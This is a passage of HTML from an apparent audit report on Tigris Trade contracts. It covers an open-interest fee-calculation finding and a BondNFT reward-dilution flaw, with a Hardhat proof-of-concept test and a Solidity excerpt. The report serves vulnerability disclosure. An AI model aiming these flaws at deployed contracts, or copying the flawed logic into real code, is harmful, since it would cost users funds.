class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&quot;Modifying functions&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Updating TP/SL on a limit order should revert&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">1) Trading</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       Limit orders and liquidations</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         Creating and executing limit buy order, should have correct price and bot fees:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      AssertionError: expected 100000 to equal 90000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      + expected - actual</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      -100000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      +90000</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Correct the calculation to use margin after fees.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1374425022\">TriHaz (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I think I confirmed a similar issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1385580324\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has highlighted an discrepancy in how OpenInterest is calculated, the math should cause issues in determining funding rates, however the submission doesn’t show a way to reliably extract value from the system.</p>\n<p>Because of this, I believe the finding to be of Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1407809212\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176899\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176899</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-22-unreleased-locks-cause-the-reward-distribution-to-be-flawed-in-bondnft\" style=\"position:relative;\"><a href=\"#m-22-unreleased-locks-cause-the-reward-distribution-to-be-flawed-in-bondnft\" aria-label=\"m 22 unreleased locks cause the reward distribution to be flawed in bondnft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630\">[M-22] Unreleased locks cause the reward distribution to be flawed in BondNFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630\">Ruhum</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/523\">wait</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/399\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/183\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/123\">Ermaniwe</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/71\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L150\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L150</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L225\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L225</a></p>\n<h3 id=\"impact-14\" style=\"position:relative;\"><a href=\"#impact-14\" aria-label=\"impact 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>After a lock has expired, it doesn’t get any rewards distributed to it. But, unreleased locks cause other existing bonds to not receive the full amount of tokens either. The issue is that as long as the bond is not released, the <code>totalShares</code> value isn’t updated. Everybody receives a smaller cut of the distribution. Thus, bond owners receive less rewards than they should.</p>\n<p>A bond can be released after it expired by the owner of it. If the owner doesn’t release it for 7 days, anybody else can release it as well. As long as the owner doesn’t release it, the issue will be in effect for at least 7 epochs.</p>\n<p>Since this causes a loss of funds for every bond holder I rate it as HIGH. It’s likely to be an issue since you can’t guarantee that bonds will be released the day they expire.</p>\n<h3 id=\"proof-of-concept-32\" style=\"position:relative;\"><a href=\"#proof-of-concept-32\" aria-label=\"proof of concept 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here’s a test showcasing the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// 09.Bonds.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">864000</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// Skip 10 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [,,,,,,,</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">,,,] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;499999999999999999986&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [,,,,,,,</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">,,,] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;499999999999999999986&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">86400</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">3</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// Skip 3 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Bond 2 expired, so it doesn&#39;t receive any of the new tokens that were distributed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [,,,,,,,</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">,,,] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;499999999999999999986&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Thus, Bond 1 should get all the tokens, increasing its pending value to 1499999999999999999960</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// But, because bond 2 wasn&#39;t released (`totalShares` wasn&#39;t updated), bond 1 receives less tokens than it should.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Thus, the following check below fails</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [,,,,,,,</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">,,,] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1499999999999999999960&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1499999999999999999986&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<p>The <code>totalShares</code> value is only updated after a lock is released:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_releaser</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Bond</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!expire&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_releaser</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Bond owner priority&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ... </span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Only shares belonging to an active bond should be used for the distribution logic.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1374438815\">TriHaz (Tigris Trade) disputed and commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Since this causes a loss of funds for every 